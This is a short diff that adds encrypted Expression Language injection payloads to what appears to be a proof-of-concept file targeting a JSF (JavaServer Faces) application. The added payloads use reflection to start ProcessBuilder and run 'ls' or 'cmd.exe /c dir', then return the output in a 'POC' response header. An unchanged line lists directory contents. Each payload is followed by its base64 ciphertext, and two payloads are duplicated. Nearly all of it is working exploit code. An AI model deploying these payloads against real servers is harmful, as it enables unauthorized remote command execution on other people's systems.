@@ -214,3 +214,12 @@ uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q
 
 payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", java.util.Arrays.toString(\"\".getClass().forName(\"java.io.File\").getConstructor(\"\".getClass()).newInstance(\"C:/Users\").list())))}")
 uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q8kdF1NAQE/IVtCzU6+L3EAyJD7v68g4UUhVeNcjBOYGqxZf9RbkalWJkapsN77q/Q8flJzTc9d1mQH0SzzXYO8suUZGCtaHm89JO3ZSdTaPFODuk+Kr/RnJKS+iAX0eHzb18Dudz0Tq6fXis56Pwa7srXFOXdAUtcWZReO0y00zEe0Un
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", \"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructor(\"\".getClass()).newInstance(\"ls\").start().getInputStream().readAllBytes())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxZIkoWzQd/CtzmFrMHGC3FW5iulcoSYVaJ+rEu+94NJu8FT2PFuCb/LjumFiugg36nRzIwGWb/lOlhyfqz8vQKUaFxEp5o1hemicf/IDpqoRe5prJTGtXM42BpmNRkgrROaCd0mh93SVZ1j+lj6Klx9vTdwwk11i0Uu/V1ZAQ3SlxCpjF2rKXiYcshB2LART5H0X8dhdcQm4g==
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", \"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructor(\"\".getClass()).newInstance(\"cmd.exe\", \"/c\", \"dir\").start().getInputStream().readAllBytes())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxZIkoWzQd/CtzmFrMHGC3FW5iulcoSYVaJ+rEu+94NJu8FT2PFuCb/LjumFiugg36nRzIwGWb/lOlhyfqz8vQKUaFxEp5o1hemicf/IDpqoRe5prJTGtXM42BpmNRkgrROU68GUkzdVjaHaT6B/1GCoW+va0YcAMMLhsGozCok0Rfb2E88UMfL0J7Q27xbDFkERE7xy28+A2MRdfHReDn82dMS26y4TwKw=
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", \"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructor(\"\".getClass()).newInstance(\"cmd.exe\", \"/c\", \"dir\").start().getInputStream().readAllBytes())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxZIkoWzQd/CtzmFrMHGC3FW5iulcoSYVaJ+rEu+94NJu8FT2PFuCb/LjumFiugg36nRzIwGWb/lOlhyfqz8vQKUaFxEp5o1hemicf/IDpqoRe5prJTGtXM42BpmNRkgrROU68GUkzdVjaHaT6B/1GCoW+va0YcAMMLhsGozCok0Rfb2E88UMfL0J7Q27xbDFkERE7xy28+A2MRdfHReDn82dMS26y4TwKw=
